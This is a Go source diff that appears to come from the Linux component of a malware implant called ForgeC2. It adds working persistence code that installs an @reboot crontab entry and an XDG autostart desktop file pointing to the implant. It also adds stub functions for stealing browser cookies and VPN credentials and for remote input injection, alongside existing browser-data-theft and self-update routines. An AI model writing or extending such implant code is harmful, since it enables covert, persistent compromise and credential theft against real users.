@@ -11,6 +11,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 )
 
@@ -32,11 +33,70 @@ func applyHideWindow(cmd *exec.Cmd) {
 
 // addPersistenceWindows is never called on linux, but provide for interface completeness
 func addPersistenceWindows() {}
+func addPersistenceDarwin() {}
 
-// Linux persistence stub (already handled in addPersistence via Debug log)
+// addPersistenceLinux installs @reboot crontab entry and ~/.config/autostart desktop file.
 func addPersistenceLinux() {
-	if Debug {
-		fmt.Printf("[*] Linux persistence stub (crontab/.bashrc/.config/autostart can be added)\n")
+	exe, err := os.Executable()
+	if err != nil {
+		if Debug {
+			fmt.Printf("[!] persistence: cannot resolve executable: %v\n", err)
+		}
+		return
+	}
+	absExe, err := filepath.Abs(exe)
+	if err != nil {
+		absExe = exe
+	}
+
+	// Method 1: crontab @reboot
+	cronLine := fmt.Sprintf("@reboot %s\n", absExe)
+	existing, _ := exec.Command("crontab", "-l").Output()
+	existingStr := string(existing)
+	if !strings.Contains(existingStr, absExe) {
+		newCron := existingStr
+		if newCron != "" && !strings.HasSuffix(newCron, "\n") {
+			newCron += "\n"
+		}
+		newCron += cronLine
+		cmd := exec.Command("crontab", "-")
+		cmd.Stdin = strings.NewReader(newCron)
+		if err := cmd.Run(); err != nil {
+			if Debug {
+				fmt.Printf("[!] persistence: crontab install failed: %v\n", err)
+			}
+		} else if Debug {
+			fmt.Printf("[*] persistence: crontab @reboot entry added for %s\n", absExe)
+		}
+	}
+
+	// Method 2: XDG autostart .desktop file
+	home := os.Getenv("HOME")
+	if home == "" {
+		return
+	}
+	autostartDir := filepath.Join(home, ".config", "autostart")
+	if err := os.MkdirAll(autostartDir, 0755); err != nil {
+		if Debug {
+			fmt.Printf("[!] persistence: mkdir autostart failed: %v\n", err)
+		}
+		return
+	}
+	desktop := fmt.Sprintf(`[Desktop Entry]
+Type=Application
+Name=ForgeC2
+Exec=%s
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+`, absExe)
+	desktopPath := filepath.Join(autostartDir, "forgec2.desktop")
+	if err := os.WriteFile(desktopPath, []byte(desktop), 0644); err != nil {
+		if Debug {
+			fmt.Printf("[!] persistence: write desktop file failed: %v\n", err)
+		}
+	} else if Debug {
+		fmt.Printf("[*] persistence: autostart desktop file written to %s\n", desktopPath)
 	}
 }
 
@@ -264,6 +324,21 @@ func stealBrowserData(browser string) string {
 	return "browser data theft is Windows-only"
 }
 
+func exportCookies(browser string) string {
+	return "cookie export is Windows-only"
+}
+
+func exportVpnCreds() string {
+	return "vpn credential export is Windows-only"
+}
+
+func remoteInputStub(payload string) string {
+	if Debug {
+		fmt.Printf("[*] remote_input stub (linux): %s\n", payload)
+	}
+	return "remote_input: stub (log only — input injection not implemented on Linux)"
+}
+
 func applyPersistence(method string, args string) string {
 	return "not supported on Linux"
 }
@@ -407,3 +482,5 @@ func selfUpdateLinux(exe, tmpPath string) string {
 
 	return "self-update: new binary downloaded, replacing and restarting..."
 }
+
+func selfUpdateDarwin(exe, tmpPath string) string { return "" }
